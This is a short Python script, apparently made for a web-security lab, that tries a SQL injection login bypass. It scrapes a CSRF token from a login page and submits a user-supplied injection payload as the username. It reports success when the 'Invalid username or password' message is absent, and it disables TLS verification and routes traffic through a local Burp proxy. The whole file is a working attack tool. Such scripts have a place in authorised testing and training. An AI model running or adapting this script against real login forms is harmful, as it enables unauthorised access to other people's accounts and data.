import sys
import requests
import urllib3
from bs4 import BeautifulSoup

# Suppress the insecure requests warning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Add proxy for troubleshoot, for urllib3 all proxies should use http
# Uses the Burp proxy -> Make sure Burp is running
proxies = {
    'http':'http://127.0.0.1:8080',
    'https':'http://127.0.0.1:8080'
}

def get_csrf_token(s, url):
    # Have to use the /login URL
    r = s.get(url, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find("input")['value']
    return(csrf)

def exploit_sqli(s, url, payload):
    csrf = get_csrf_token(s, url)
    data = {
        "csrf": csrf,
        "username": payload,
        "password": "random"
    }
    r = s.post(url, data=data, verify=False, proxies=proxies)
    
    if "Invalid username or password" not in r.text:
       return True
    else:
       return False

if __name__ == "__main__":
    try:
        url = sys.argv[1].strip()
        payload = sys.argv[2].strip()
    except IndexError:
        print(f'[-] Usage: {sys.argv[0]} <url> <payload>')
        print(f'[-] Exmaple: {sys.argv[0]} www.example.com <payload>')
        sys.exit(-1)

    s = requests.Session()
    

    if exploit_sqli(s, url, payload):
        print("[*] SQLi successful")
    else:
        print("[-] SQLi unsuccessful")
